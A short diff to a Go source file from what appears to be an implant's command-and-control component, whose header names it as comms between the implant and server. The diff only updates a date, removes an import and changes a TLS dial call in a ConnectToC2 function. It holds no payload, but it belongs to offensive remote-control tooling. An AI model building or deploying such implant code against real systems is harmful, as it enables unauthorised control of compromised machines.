@@ -5,7 +5,7 @@ package main
  * Comms between the implant and server.
  * By J. Stuart McMurray
  * Created 20220327
- * Last Modified 20220402
+ * Last Modified 20220411
  */
 
 import (
@@ -18,7 +18,6 @@ import (
 	"strconv"
 	"strings"
 
-	"github.com/magisterquis/jec2/cmd/internal/common"
 	"golang.org/x/crypto/ssh"
 )
 
@@ -66,7 +65,7 @@ func ConnectToC2() (
 			c.RemoteAddr(),
 		)
 	case "tls":
-		c, err := common.DialTLS(u.Host)
+		c, err = DialTLS(u.Host)
 		if nil != err {
 			break
 		}
